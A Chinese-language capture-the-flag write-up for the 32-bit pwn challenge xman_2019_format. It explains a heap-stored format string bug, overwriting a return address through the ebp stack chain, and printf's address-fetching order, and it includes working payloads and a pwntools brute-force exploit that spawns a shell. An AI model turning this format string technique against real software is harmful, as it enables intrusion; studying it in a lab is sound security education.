[toc]

## xman_2019_format

### 总结

根据本题，学习与收获有：

- `printf`的字符串，如果是在堆上，那么就无法在栈上写地址利用`%x$hn`去修改
- `printf`会一次性取出所有的偏移的地址，再去修改。不是边写边修改！(结合调试过程理解！)
- 由于`ebp`寄存器会记录一个栈地址链，所以可以利用这一点特性，爆破修改这个栈地址链的最低字节，然后修改`ebp`寄存器后`4`个字节的内容，理想状态下，爆破`1`个字节即可，而且，所有的地址都是对齐到地址页。

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163000.png)

#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163109.png)

##### sub_804869D

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163155.png)

##### sub_8048651

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163247.png)

##### sub_804862A

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163324.png)

##### sub_80485c4

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163407.png)

层层套娃，终于走到了最后的处理函数。`strtok`是字符串分割函数，分割的符号为`|`。

#### 漏洞点

漏洞点很清楚，就是函数`sub_80485c4`中，将传入的字符串使用`|`分割后，直接调用`printf`函数。很明显的格式化字符串漏洞。但是这里要注意：**字符串存储在堆上**。所以，不能在栈上写地址，然后利用栈的偏移来向任意地址写。因此，只能借助栈上已有的地址，往`eip`寄存器里面写入目标地址。

注意到有一个后门函数：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163742.png)

只需要覆盖为这个函数的地址即可。

### 利用思路

因此，本题利用的思路很清晰：

- `printf`确定偏移

- 利用栈上的地址链，特别是`ebp`地址链，修改中间某一个地址的最低字节，修改为存储`eip`寄存器内容的那个地址
- 将这个可能会被压入`eip`寄存器的地址的内容，修改为`0x80475AB`
- get_shell

### EXP

#### 调试过程

本题需要一步步调试出来，首先测试一下偏移：

```python
# 输入：%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
```

输入之前看一下栈：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164446.png)

这个调用链还是很明显的

执行完成打印出来的内容为：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164548.png)

数一下，偏移为`10`。

这个时候需要结合栈图整理一下思路：

- 首先修改`0xffffceb8`地址处的内容为`0xffffce9c`，这里需要修改最低的一个字节，偏移为10
- 然后修改`0xffffce9c`地址处的内容为`0x80485ab`，这里只需要修改最低的两个字节，偏移为18

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164824.png)

很容易写出最后的输入应该为：

`%156c%10$hhn%34219c%18$hn`

可以调试一下，在`printf`函数下个断点，然后观察一下`0xfffceb8`的内容变化：

第一次命中断点：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165452.png)

第二次命中断点：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165843.png)

此处的值已经改变：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165916.png)

可以看到，最低字节已经修改成功。然后继续执行`printf`，看下`0xffffce9c`是不是修改为目标值：

发现修改失败了：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313170652.png)

还是修改的最初的`0xffffcee8`的内容，并不是去修改的`0xffffce9c`的内容！这说明，`printf`格式化执行的时候，首先把所有对应偏移的地址先取出来，然后再去修改！

题目中，有一个`|`分割符，因此，只需要利用分割符分开输入即可！

所以，最终的输入为：

`%156c%10$hhn|%34219c%18$hn`

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171253.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171327.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171410.png)

执行了`/bin/bash`

#### 完整exp

实际上需要爆破最低的那个字节，所以最终的exp如下：

```python
from pwn import *

context.log_level='debug'

for x in range(4, 0x100, 4):
    tar = '%' + str(x) + 'c%10$hhn|%34219c%18$hn'
    try:
        sh = process('./xman_2019_format')
        # sh = remote('node3.buuoj.cn', 27180)
        log.info('current low byte:{}'.format(hex(x)))
        sh.recv()
        sh.sendline(tar)
        sh.recv(timeout=1)
        sleep(1)
        sh.sendline('cat flag')
        sh.recvline_contains('flag', timeout=1)
        sh.interactive()
    except:
        sh.close()
```

远程爆破过程为：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171910.png)